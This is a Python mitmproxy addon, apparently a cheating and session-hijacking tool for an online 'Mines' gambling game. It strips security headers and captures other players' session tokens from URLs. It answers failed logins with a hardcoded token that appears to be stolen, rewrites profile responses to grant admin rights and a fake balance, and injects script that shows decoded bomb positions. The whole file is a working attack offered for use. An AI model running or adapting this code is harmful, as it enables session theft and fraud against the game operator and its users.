# ==============================================================================
# IA VIDENTE - v4.5 GHOST SESSION (Ultra Bypass & Hijacker)
# ==============================================================================
import os
import json
import re
import zlib
import urllib.parse
from datetime import datetime
from mitmproxy import http, ctx

# Configurações
LOG_FILE = "vidente_history.log"
VERSION = "4.5.0"

# Sementes Capturadas dos Logs (Ghost Fallback)
GHOST_DATA = {
    "user": "4273537843",
    "token": "v1~RCbrlUqiuYO_ajzQh4E_6M-Xgiow3Vkv639yrYG6Grv5jaysF2bviDNyXicgMCsKoBzUwOyO_srekc4FVZsNsEZoOQ-5s",
    "uid": "5-sDAqVW_CDlMP0PrZtux2l2xHaF8kEIn2F-nLsm8IdQi9A4Pccuc-DMfWyum41oyehkElOa-oWdyE4FJLeUXx3vBL7ptrIt6wbYKvuC0wTvzW4bD4Fa_fNI7_GokCEDJ4aQvGAnHa-RDOey68vCRZK2cEadZFAIBA9sexrwmLnNpoxY7eMmlgkpU2OJVAxqn-YgTXYcaklSpoOvRFH-34JI-vqQ",
    "tid": "3022708",
    "gid": "3"
}

HUD_HTML = """
<div id="vidente-hud" style="position:fixed; top:20px; left:20px; width:280px; background:rgba(0,0,0,0.96); border:2px solid #0ff; border-radius:12px; z-index:999999; color:white; font-family:monospace; padding:15px; box-shadow:0 0 40px rgba(0,255,255,0.7); cursor: move; user-select: none; backdrop-filter: blur(20px);">
    <div style="font-weight:bold; margin-bottom:10px; display:flex; justify-content:space-between; align-items:center; border-bottom: 2px solid #0ff; padding-bottom: 5px;">
        <span style="color:#0ff; text-shadow: 0 0 15px #0ff;">🔮 GHOST VIDENTE v4.5</span>
        <span id="v-status" style="font-size:10px; color:#0f0;">GHOST: ON</span>
    </div>
    
    <div id="v-grid" style="display:grid; grid-template-columns: repeat(5, 1fr); gap:6px; margin:10px 0; background:rgba(0,0,0,0.9); padding:10px; border-radius:10px; border: 2px solid #333;">
        <!-- Grid cells -->
    </div>
    
    <div id="v-balance-info" style="font-size:11px; color:#0f0; margin-bottom:12px; text-align:center; background:rgba(0,255,0,0.15); padding:10px; border-radius:8px; border: 1px solid #0f0; box-shadow: inset 0 0 15px rgba(0,255,0,0.1);">
        💎 SALDO FANTASMA: R$ <span id="v-current-balance">9.999.999,00</span>
    </div>

    <div style="font-size:10px; margin-top:10px; display:flex; gap:6px; justify-content:center; flex-wrap:wrap;">
        <button onclick="rotateGrid()" style="background:#111; border:1px solid #0ff; color:#0ff; padding:8px; cursor:pointer; border-radius:6px; flex:1; font-weight:bold; height:38px;">ROTAR</button>
        <button onclick="toggleMirror()" style="background:#111; border:1px solid #0ff; color:#0ff; padding:8px; cursor:pointer; border-radius:6px; flex:1; font-weight:bold; height:38px;">ESPELHAR</button>
        <button onclick="clearGrid()" style="background:#111; border:1px solid #f44; color:#f44; padding:8px; cursor:pointer; border-radius:6px; flex:1; font-weight:bold; height:38px;">CLEAN</button>
    </div>
    <div id="v-mode" style="font-size:11px; color:#0ff; margin-top:12px; text-align:center; font-weight:bold; text-transform:uppercase; letter-spacing:3px; text-shadow:0 0 10px #0ff;">SESSÃO SEQUESTRADA</div>
</div>

<script>
    (function() {
        if (window.vidente_loaded) return;
        window.vidente_loaded = true;

        const hud = document.getElementById('vidente-hud');
        let isDragging = false, startX, startY, initialLeft, initialTop;
        
        hud.addEventListener('mousedown', (e) => {
            if(e.target.tagName === 'BUTTON') return;
            isDragging = true;
            startX = e.clientX; startY = e.clientY;
            const rect = hud.getBoundingClientRect();
            initialLeft = rect.left; initialTop = rect.top;
            hud.style.right = 'auto'; hud.style.left = initialLeft + 'px'; hud.style.top = initialTop + 'px';
        });
        window.addEventListener('mousemove', (e) => {
            if(!isDragging) return;
            hud.style.left = (initialLeft + (e.clientX - startX)) + 'px';
            hud.style.top = (initialTop + (e.clientY - startY)) + 'px';
        });
        window.addEventListener('mouseup', () => isDragging = false);

        let baseGrid = []; let currentSymmetry = 0; let revealedCells = {}; 

        const renderGrid = (mines) => {
            if (mines) baseGrid = mines;
            const gridDiv = document.getElementById('v-grid');
            gridDiv.innerHTML = '';
            let transformed = applySymmetry(baseGrid, currentSymmetry);
            for (let i = 0; i < 25; i++) {
                const cell = document.createElement('div');
                cell.style.width = '100%'; cell.style.paddingBottom = '100%';
                cell.style.background = transformed.includes(i) ? 'rgba(255,0,0,0.9)' : '#080808';
                cell.style.border = transformed.includes(i) ? '2px solid #f00' : '1px solid #444';
                cell.style.borderRadius = '8px'; cell.style.position = 'relative';
                
                if (revealedCells[i]) {
                    cell.style.background = revealedCells[i] === 'mine' ? '#411' : '#141';
                    cell.innerHTML = `<span style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); font-size:22px;">${revealedCells[i] === 'mine' ? '💥' : '💎'}</span>`;
                } else if (transformed.includes(i)) {
                    cell.innerHTML = '<span style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); font-size:18px; filter:drop-shadow(0 0 8px #f00);">💣</span>';
                }
                gridDiv.appendChild(cell);
            }
        };

        const applySymmetry = (mines, sym) => {
            return mines.map(idx => {
                let r = Math.floor(idx / 5), c = idx % 5;
                if (sym === 1) c = 4 - c; if (sym === 2) r = 4 - r;
                if (sym === 3) { let t = r; r = c; c = 4 - t; }
                if (sym === 4) { r = 4 - r; c = 4 - c; }
                if (sym === 5) { let t = r; r = 4 - c; c = t; }
                if (sym === 6) { let t = r; r = c; c = t; }
                if (sym === 7) { let t = r; r = 4 - c; c = 4 - r; }
                return r * 5 + c;
            });
        };

        const handleData = (data) => {
            if (!data) return;
            if (data.vidente_grid) { 
                baseGrid = data.vidente_grid; 
                document.getElementById('v-mode').innerText = "VISÃO ATIVA!"; 
                document.getElementById('v-mode').style.color = "#0f0";
                renderGrid(); 
            }
        };

        window.rotateGrid = () => { currentSymmetry = (currentSymmetry + 1) % 8; renderGrid(); };
        window.toggleMirror = () => { currentSymmetry = (currentSymmetry === 1 ? 0 : 1); renderGrid(); };
        window.clearGrid = () => { baseGrid = []; revealedCells = {}; renderGrid(); document.getElementById('v-mode').innerText = "GHOST ACTIVE"; document.getElementById('v-mode').style.color = "#0ff"; };

        window.balance = 9999999;
        window.totalBalance = 9999999;
        
        setInterval(() => {
            if (window.vidente_grid_injetado) {
                handleData({vidente_grid: window.vidente_grid_injetado});
                window.vidente_grid_injetado = null; 
            }
        }, 300);
    })();
</script>
"""

class Vidente:
    def __init__(self):
        self.log_file = LOG_FILE
        self.session = GHOST_DATA.copy()

    def log_console(self, text):
        ts = datetime.now().strftime('%H:%M:%S')
        msg = f"[{ts}] {text}"
        print(msg)
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(msg + "\n")

    def _hijack_session(self, url):
        """Captura dinamicamente token/uid de qualquer jogo aberto"""
        try:
            query = urllib.parse.parse_qs(urllib.parse.urlparse(url).query)
            changed = False
            for key in ["token", "user", "uid", "tid", "gid", "operator"]:
                if key in query:
                    val = query[key][0]
                    if self.session.get(key) != val:
                        self.session[key] = val
                        changed = True
            if changed:
                self.log_console(f"[GHOST] Sesso Sequestrada Atualizada: UID={self.session.get('user')} TID={self.session.get('tid')}")
        except: pass

    def response(self, flow: http.HTTPFlow):
        url = flow.request.pretty_url.lower()

        # BYPASS CSP
        for h in ["Content-Security-Policy", "X-Content-Security-Policy"]:
            if h in flow.response.headers: del flow.response.headers[h]

        # SEQUESTRO DE SESSÃO
        if "token=" in url or "uid=" in url:
            self._hijack_session(url)

        # 1. GHOST BYPASS DE LOGIN (Remedia Erro 400 e Evita Erro 500)
        if "trpc/game.login" in url:
            if flow.response.status_code == 400:
                self.log_console(f"[!] Erro 400 Detectado. Usando Sesso Fantasma GHOST v4.5...")
                
                # Extrai GameId se possvel
                game_id = self.session.get("gid", "3")
                try:
                    inp = json.loads(urllib.parse.parse_qs(urllib.parse.urlparse(url).query).get('input', ['{}'])[0])
                    game_id = str(inp.get("json", {}).get("gameId", game_id))
                except: pass

                flow.response.status_code = 200
                
                # Reconstri a URL de entrada com a sesso sequestrada
                # Se no tiver sesso atual, usa o Fallback dos logs
                s = self.session
                ghost_url = (
                    f"https://api.h-z-9-a.com/mines?gameMode=mines"
                    f"&apiUrl=api.h-z-9-a.com&currency=BRL&jurisdiction=CW&lang=pt"
                    f"&operator={s.get('operator', 'test')}&user={s.get('user')}"
                    f"&token={s.get('token')}&gid={game_id}&tid={s.get('tid')}"
                    f"&uid={s.get('uid')}&x-tid={s.get('tid')}&vv=vidente_ghost_45"
                )
                
                fake_success = {"result": {"data": {"json": {"loginUrl": ghost_url}}}}
                flow.response.text = json.dumps(fake_success)
                self.log_console(f"    [🏆 GHOST BOOT] URL Injetada: {ghost_url[:80]}...")

        # 2. MONEY HOOK (Escala de Saldo no Perfil)
        if "trpc/user.details" in url:
            try:
                data = json.loads(flow.response.text)
                if "result" in data:
                    node = data["result"]["data"]["json"]
                    node.update({
                        "role": "admin", "isAdmin": True,
                        "balance": 9999999, "totalBalance": 9999999,
                        "rechargeAmount": 1000, "vipLevel": 10
                    })
                    flow.response.text = json.dumps(data)
                    self.log_console(f"[$] MONEY HOOK: Saldo VIP Ativado para ID {node.get('id')}")
            except: pass

        # 3. HUD v4.5 Injeo
        if ("mines" in url or "game" in url) and "text/html" in flow.response.headers.get("Content-Type", ""):
            if b"vidente-hud" not in flow.response.content and b"</body>" in flow.response.content:
                flow.response.content = flow.response.content.replace(b"</body>", HUD_HTML.encode() + b"</body>")
                self.log_console(f"[HUD v4.5] GHOST SESSION Hijacker em Execuo.")

        # 4. Deep Cortex Decoder (Motor de Bombas Binário)
        if "/spribe/api/send" in url and flow.request.method == "POST":
            if flow.response.status_code == 200:
                try:
                    raw_text = flow.response.text
                    data = json.loads(raw_text)
                    payload_bin = data.get("message") if isinstance(data.get("message"), dict) else (data if "0" in data else None)

                    if payload_bin:
                        # Reconstri o buffer binário do dicionário Spribe
                        sorted_keys = sorted([int(k) for k in payload_bin.keys() if k.isdigit()])
                        byte_arr = bytearray([int(payload_bin[str(k)]) for k in sorted_keys])
                        try: buf = zlib.decompress(byte_arr, -zlib.MAX_WBITS)
                        except:
                            try: buf = zlib.decompress(byte_arr)
                            except: buf = byte_arr
                        
                        # Heurística Protobuf Scan Cluster
                        pts = []
                        for i in range(len(buf) - 1):
                            if buf[i] in [8, 16, 24, 32, 40] and 0 <= buf[i+1] <= 24:
                                pts.append(int(buf[i+1]))
                        
                        bombas = sorted(list(set(pts))) if 1 <= len(set(pts)) <= 24 else None
                        
                        if bombas:
                            self.log_console(f"    [!!!] BOMBAS DETECTADAS: {bombas}")
                            bridge = f"<script>window.vidente_grid_injetado = {bombas};</script>"
                            flow.response.text = raw_text + bridge
                except: pass

addons = [Vidente()]
